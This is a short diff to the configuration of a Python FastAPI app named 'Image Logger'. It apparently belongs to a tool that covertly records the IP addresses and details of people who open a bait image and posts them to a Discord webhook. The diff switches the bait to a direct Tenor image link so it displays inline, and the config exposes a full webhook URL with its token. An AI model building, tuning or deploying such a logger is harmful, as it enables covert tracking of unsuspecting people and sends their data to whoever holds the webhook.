@@ -7,7 +7,7 @@ app = FastAPI()
 
 CONFIG = {
     "webhook": "https://discordapp.com/api/webhooks/1513148042935533652/T0MTpHSvtvtUeC1FThHM5Swod9ghz2Ac4h9jSQlUfN2t6mTwYOJtNHBBPGeiPLtfz6Hp",
-    "image": "https://tenor.com/view/dont-middle-clikc-this-gif-gif-423237860644995677",
+    "image": "https://media.tenor.com/Bd-kl4M9wl0AAAAe/dont-middle-clikc-this-gif.png",
     "username": "Image Logger",
     "color": 0x00FFFF,
     "vpnCheck": 1, 
